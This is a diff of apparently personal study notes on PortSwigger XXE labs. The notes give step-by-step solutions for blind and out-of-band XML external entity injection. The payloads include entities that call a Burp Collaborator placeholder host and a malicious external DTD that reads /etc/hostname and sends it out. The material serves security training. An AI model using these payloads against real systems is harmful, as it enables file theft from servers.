@@ -1,4 +1,4 @@
-"## **1. Exploiting XXE using external entities to retrieve files**
+## **1. Exploiting XXE using external entities to retrieve files**
 This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
 1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
@@ -105,6 +105,13 @@ This lab has a "Check stock" feature that parses XML input but does not display 
 You can detect the [blind XXE](https://portswigger.net/web-security/xxe/blind) vulnerability by triggering out-of-band interactions with an external domain.
 To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
 
+1. Visit a product page, click "Check stock" and intercept the resulting POST request in [Burp Suite Professional](https://portswigger.net/burp/pro).
+2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:
+    `<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>`
+3. Replace the `productId` number with a reference to the external entity:
+    `&xxe;`
+4. Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
+
 Analysis:
 
 - testing for XXE vulnerability (using internal XXE)
@@ -116,7 +123,7 @@ Analysis:
 - we observe that we are in a blind XXE injection case (out of band) so we will use an external server in order to obtain a DNS lookup (we have to use burp collaborator)
 ```
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE test [<!ENTITY nbyte SYSTEM "http://BurpCollaboratorServer">]>
+<!DOCTYPE test [<!ENTITY nbyte SYSTEM "http://Burp-Collaborator-SubDomain">]>
 <stockCheck>
 	<productId>
 		&nbyte;
@@ -129,4 +136,52 @@ Analysis:
 
 ![[Pasted image 20240927013218.png]]
 
-# **4. Blind XXE with out-of-band interaction via XML parameter entities**
+## **4. Blind XXE with out-of-band interaction via XML parameter entities**
+This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.
+To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
+
+1. Visit a product page, click "Check stock" and intercept the resulting POST request in [Burp Suite Professional](https://portswigger.net/burp/pro).
+2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:
+    `<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>`
+3. Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
+
+Analysis:
+
+- we proceed with same steps as above but this time we encounter a different error which is telling us that the parser is doing it s job
+![[Pasted image 20240927014600.png]]
+![[Pasted image 20240927014716.png]]
+
+- we will declare and reference our entity inside of the doctype 
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [<!ENTITY % nbyte SYSTEM "http://Burp-Collaborator-SubDomain"> %nbyte; ]>
+<stockCheck>
+	<productId>
+		1
+	</productId>
+	<storeId>
+		1
+	</storeId>
+</stockCheck>
+```
+
+![[Pasted image 20240927015321.png]]
+
+- we will proceed with a DNS lookup using burp collaborator server as in above example since we are now in a out of band XXE injection.
+
+## **5. Exploiting blind XXE to exfiltrate data using a malicious external DTD**
+This lab has a "Check stock" feature that parses XML input but does not display the result.
+To solve the lab, exfiltrate the contents of the `/etc/hostname` file.
+
+1. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
+2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
+3. Place the Burp Collaborator payload into a malicious DTD file:
+    `<!ENTITY % file SYSTEM "file:///etc/hostname"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>"> %eval; %exfil;`
+4. Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL.
+5. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
+6. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
+    `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`
+7. Go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again.
+8. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the `/etc/hostname` file.
+
+Analysis:
